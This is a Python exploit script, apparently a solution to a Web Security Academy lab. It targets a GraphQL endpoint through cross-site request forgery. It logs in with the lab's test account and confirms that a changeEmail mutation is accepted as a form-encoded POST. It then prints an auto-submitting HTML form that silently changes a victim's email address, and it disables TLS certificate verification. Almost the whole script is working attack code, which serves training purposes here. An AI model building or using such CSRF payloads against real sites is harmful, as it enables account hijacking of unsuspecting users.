import http.client
import json
import random
import re
import ssl
import sys
import urllib

LAB_ID = "???"


def graphql_login() -> http.client.HTTPResponse:
    method, path = 'POST', '/graphql/v1'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'content-type': 'application/json',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'te': 'trailers',
    }
    fields = {
        "query": f"""
            
                mutation login($input: LoginInput!) {{
                    login(input: $input) {{
                        token
                        success
                    }}
                }}
        """,
        "operationName": "login",
        "variables": {
            "input": {
                "username": "wiener",
                "password": "peter",
            },
        },
    }
    body = json.dumps(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def POST_graphql_v1(
        session: str,
        query: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/graphql/v1'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/my-account',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'cookie': f'session={session}',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'te': 'trailers',
    }
    fields = {
        "query": query,
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def login_session():
    response = graphql_login()
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]


def change_email_query(email: str) -> str:
    query = f"""
                mutation changeEmail {{
                    changeEmail(input: {{email: "{email}"}}) {{
                        email
                    }}
                }}
        """
    return ' '.join(query.split())


def escape_quotes(text: str) -> str:
    return text.replace('"', '&quot;')


print("checking if application/x-www-form-urlencoded will go")
session = login_session()
email = f"wiener{random.randint(0, 999)}@afsdiguahsfasd.com"
response = POST_graphql_v1(session, change_email_query(email))
print(f"response status: {response.status}")
if response.status != 200:
    sys.exit()
body = json.loads(response.read().decode('utf-8'))
print(f"response body: {body}")
if body['data']['changeEmail']['email'] != email:
    print("sanity check failed, email not changed")
    sys.exit()
print("sanity check succeeded")

email = f"wiener{random.randint(0, 999)}@afsdiguahsfasd.com"
print("Exploit:")
print("""
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
""")
print("Body:")
print(f"""
<html>
    <body>
        <form action="https://{LAB_ID}.web-security-academy.net/graphql/v1" method="POST">
            <input type="hidden" name="query" value="{escape_quotes(change_email_query(email))}" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
""")
